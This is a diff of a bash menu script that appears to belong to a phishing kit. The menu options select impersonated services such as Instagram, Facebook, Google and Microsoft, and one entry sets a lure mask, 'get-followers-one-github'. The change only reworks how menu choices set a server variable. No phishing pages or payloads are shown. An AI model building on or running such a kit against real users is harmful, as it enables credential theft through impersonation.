@@ -189,10 +189,12 @@ printf "\e[1;92m[\e[0m\e[1;77m00\e[0m\e[1;92m]\e[0m\e[1;91m Exit\e[0m           
 read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\e' menu_option
 
 if [[ $menu_option == 1 || $menu_option == 01 ]]; then
-instagram
+server="instagram"
+start1
 
 elif [[ $menu_option == 2 || $menu_option == 02 ]]; then
-facebook
+server="facebook"
+start1
 
 elif [[ $menu_option == 3 || $menu_option == 03 ]]; then
 server="snapchat"
@@ -209,7 +211,8 @@ mask='get-followers-one-github'
 start1
 
 elif [[ $menu_option == 6 || $menu_option == 06 ]]; then
-Google
+server="google"
+start1
 
 elif [[ $menu_option == 7 || $menu_option == 07 ]]; then
 server="spotify"
@@ -250,7 +253,7 @@ server="wordpress"
 start1
 
 elif [[ $menu_option == 16 ]]; then
-microsoft
+server="microsoft"
 start1
 
 elif [[ $menu_option == 17 ]]; then
